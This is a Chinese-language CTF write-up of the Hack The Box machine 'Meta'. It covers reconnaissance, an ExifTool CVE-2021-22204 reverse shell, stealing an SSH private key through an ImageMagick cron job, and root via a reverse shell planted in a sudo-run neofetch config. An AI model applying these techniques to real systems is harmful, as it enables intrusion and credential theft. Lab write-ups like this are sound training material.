  </head>
  <body>
    <h1><a title="Meta-Writeup">Meta-Writeup</a></h1>
    <h2><time>2022-02-18</time></h2>
<h3 id="普通用户">普通用户</h3>

<p>给到了ip，常规nmap扫一下</p>

<pre><code class="language-HTML">nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.140</code></pre>
<p><img src="..\images\Meta\nmap.jpg" alt="nmap" /></p>
<p>可以看到一个22端口和80端口，我们修改hosts文件访问artcorp.htb</p>
<img src=".\Meta\hosts.png" alt="hosts">
<img src=".\Meta\artcorp.png" alt="artcorp.png">
<p>页面看起来没啥，dirsearch,rad啥的都跑了一遍没啥发现。对子域名fuzz一下</p>
<pre><code class="language-HTML">wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.artcorp.htb" --hc 400,302,301 artcorp.htb</code></pre>
<p><img src=".\Meta\Fuzz.jpg" alt="Fuzz" /></p>
<p>发现有一个子域dev01,加到hosts里面再访问一下</p>
<img src=".\Meta\dev01.png" alt="dev01">
<p>发现是一个图片上传点,上传一个普通图片之后发现这个是exiftool,看看有无漏洞</p>
<pre><code class="language-HTML">searchsploit exiftool</code></pre>

<p>发现一个pdf，在浏览器中查看一下是CVE-2021-22204<del>(原理我就不说了,想了解的自行百度一下吧)</del>。去Git找一下exp : https://github.com/AssassinUKG/CVE-2021-22204</p>

<p>找一个正常图片放到exp目录运行一下</p>
<pre><code class="language-HTML">./CVE-2021-22204.sh "reverseme YourIP YourPort" 图片</code></pre>
<img src=".\Meta\exiftool.png" alt="exiftool">
<p>nc监听一下本地端口，然后上传图片,收到shell,用python换一下shell</p>
<pre><code class="language-HTML">python3 -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
<img src=".\Meta\shell.png" alt="shell">
<p><code>cat /etc/passwd|grep bash</code>查看用户。可以看到thomas下面有user.txt但是读取不了。</p>
<img src=".\Meta\testgetflag.png" alt="test">
<p>首先使用pspy32尝试监控内存看看是否有异常，首先我们在我们这开一个HTTP<code>python3 -m http.server</code>在nc反弹的shell那用<code>wget http://yourip:yourport/pspy32</code>获取pspy32后赋予权限运行</p>
<img src=".\Meta\mogrify.png" alt="mo">
<p>可以看到有一个具有thomas权限的定时任务，查看一下<code>cat /usr/local/bin/convert_images.sh</code></p>

<script>
(function () {
  var headings = document.querySelectorAll('h1,h2,h3,h4');
  for (var i = 0; i < headings.length; i++) {
    var e = headings[i];
    if (e.id) {
      var link = document.createElement('a');
      link.classList.add('anchor');
      link.href = '#' + e.id;
      e.appendChild(document.createTextNode(' '));
      link.appendChild(document.createTextNode('\u00b6'));
      e.appendChild(link);
    }
  }
})();
</script>
    www-data@meta:/var/www/dev01.artcorp.htb/metaview$ cat /usr/local/bin/convert_images.sh
    artcorp.htb/metaview$ cat /usr/local/bin/convert_images.sh 
    #!/bin/bash
    cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
    pkill mogrify
  </body>
<p>意思就是在convert_images下面定时运行mogrify。注:mogrify是ImageMagick的一个命令。</p>
<p>我们寻找一下ImageMagick可用的漏洞https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html</p>
<img src=".\Meta\poc.png" alt="poc">
<p>这里可以看到poc，稍微修改下,再下载</p>
<img src=".\Meta\wait.png" alt="wait">
<p>首先这里可以直接尝试获取<code>/home/thomas/user.txt</code>的内容，我这里选择先获取ssh的私钥，放在<code>/dev/shm/</code>下面是因为shm是临时存放文件的地方，不在硬盘上在内存上，而我们不知道<code>thomas</code>的权限所能写的文件夹是哪些，所以默认选择shm这个文件夹。等待一会。。。。</p>
<img src=".\Meta\id.png" alt="id">
<p>可以看到获取到了私钥，我们用同样的办法获取一下<code>authorized_keys</code>将其复制到自己的公钥文件中，即可使用私钥ssh连接getflag。<del>具体原理百度吧</del></p>
<pre><code>ssh thomas@10.10.11.140 -i /root/.ssh/id_rsa</code></pre>
<img src=".\Meta\thomasflag.png" alt="thomas">
<h3 id="普通用户">提权</h3>
<p>看一下<code>sudo -l</code></p>
<img src=".\Meta\sudo.png" alt="sudo">
<p>看到可以允许neofetch这个命令在不需要密码的情况下运行(不加参数)。</p>
<p>https://www.tecmint.com/neofetch-shows-linux-system-information-with-logo/</p>
<p>通过上面可知neofetch能在终端显示你的系统信息及系统logo，它拥有一个配置文件，配置文件可以写入bash命令并执行</p>
<p>我们尝试在config文件里面写入反弹shell的bash</p>
<img src=".\Meta\bashneo.png" alt="neo">
<p>保存退出后修改一下<code>XDG_CONFIG_HOME</code>让以sudo执行时能使用到我们更改的config文件</p>
<code>export XDG_CONFIG_HOME=/home/thomas/.config</code>
<p></p>
<p>注:<code>XDG_CONFIG_HOME</code>是程序在执行时默认读取配置文件的位置，如果没有的话则默认为<code>{$HOME}/.config</code>如果以sudo执行的话默认HOME的位置是root的HOME，所以无法读取到我们修改的config文件</p>
<p>在本机开个监听端口，执行<code>sudo neofetch</code>获得反弹的shell <strong>getflag</strong></p>
<img src=".\Meta\rootflag.png" alt="rootflag">

